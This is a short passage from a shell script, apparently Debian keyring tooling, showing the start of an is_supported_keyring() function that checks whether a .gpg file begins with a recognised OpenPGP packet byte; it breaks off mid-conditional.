   309	is_supported_keyring() {
   310	    # empty files are always supported
   311	    if ! test -s "$1"; then
   312		return 0
   313	    fi
   314	    local FILEEXT="${1##*.}"
   315	    if [ "$FILEEXT" = 'gpg' ]; then
   316		# 0x98, 0x99 and 0xC6 via octal as hex isn't supported by dashs printf
   317		if printf '\231' | cmp -s -n 1 - "$1"; then
   318		    true
   319		elif printf '\230' | cmp -s -n 1 - "$1"; then
   320		    true
   321		elif printf '\306' | cmp -s -n 1 - "$1"; then
   322		    true
   323		else
